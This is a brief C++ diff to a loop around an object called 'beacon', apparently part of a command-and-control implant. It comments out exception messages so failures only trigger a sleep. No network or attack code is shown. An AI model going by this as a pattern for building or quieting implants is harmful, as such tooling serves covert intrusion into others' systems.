@@ -30,12 +30,13 @@ int main(int argc, char* argv[])
 		}
 		catch(const std::exception& ex)
 		{
-			std::cout << "Exeption " << ex.what() << std::endl;
+			std::cout << "Exeption " << std::endl;
+			// std::cout << "Exeption " << ex.what() << std::endl;
 			beacon->sleep();
 		}
 		catch (...) 
 		{
-			std::cout << "Exeption" << std::endl;
+			// std::cout << "Exeption" << std::endl;
 			beacon->sleep();
 		}
 	}
